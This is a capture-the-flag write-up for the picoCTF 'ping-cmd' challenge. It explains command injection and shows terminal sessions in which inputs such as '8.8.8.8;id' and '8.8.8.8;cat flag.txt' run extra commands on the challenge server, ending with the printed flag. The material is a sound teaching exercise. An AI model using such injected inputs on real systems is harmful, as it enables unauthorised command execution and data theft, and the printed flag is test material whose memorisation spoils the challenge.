# Overview

#### Next up, `ping-cmd` which is pretty simple actually. It introduces us to the concept of [Command Injection](https://hacktricks.wiki/en/pentesting-web/command-injection.html\#what-is-command-injection) which permits the execution of arbitrary operating system commands by an attacker on the server hosting an application.

> *Description of **ping-cmd**:*
```
Can you make the server reveal its secrets? It seems to be able to ping Google DNS,
but what happens if you get a little creative with your input?

You can connect to the service here nc mysterious-sea.picoctf.net 58700
```

# Analysis

#### Connecting to the server prompt us a server to ping and it runs the `ping` command along with the given unsanitized input.

```
┌──(root💀lsd-AbsentRobust)-[~/picoCTF-writeup/general_skills/easy/ping-cmd]
└─# nc mysterious-sea.picoctf.net 58700
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.51 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.88 ms

--- 8.8.8.8 ping statistics ---
...
```

#### We can observe by giving the input `8.8.8.8;id` which includes the `id` command, it returns the *uid, guid and groups*. This proves that it is vulnerable to `Command Injection`.

> *Testing for `Command Injection`:*
```
┌──(root💀lsd-AbsentRobust)-[~/picoCTF-writeup/general_skills/easy/ping-cmd]
└─# nc mysterious-sea.picoctf.net 58700
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8;id
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.53 ms
...

uid=1000(ctf-player) gid=1000(ctf-player) groups=1000(ctf-player)
```

# Solution

#### We can send the command `ls` to list the files in the current directory to look for the flag.

> *Sending `8.8.8.8;ls` and finding `flag.txt`:*
```
┌──(root💀lsd-AbsentRobust)-[~/picoCTF-writeup/general_skills/easy/ping-cmd]
└─# nc mysterious-sea.picoctf.net 58700
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8;ls
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.57 ms
...

flag.txt
script.sh
```

#### We found `flag.txt`! now we just need to read it using `cat` to get the flag.

```
┌──(root💀lsd-AbsentRobust)-[~/picoCTF-writeup/general_skills/easy/ping-cmd]
└─# nc mysterious-sea.picoctf.net 58700
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8;cat flag.txt
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
...

picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_17ae04f2}
```
```
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_17ae04f2}
```
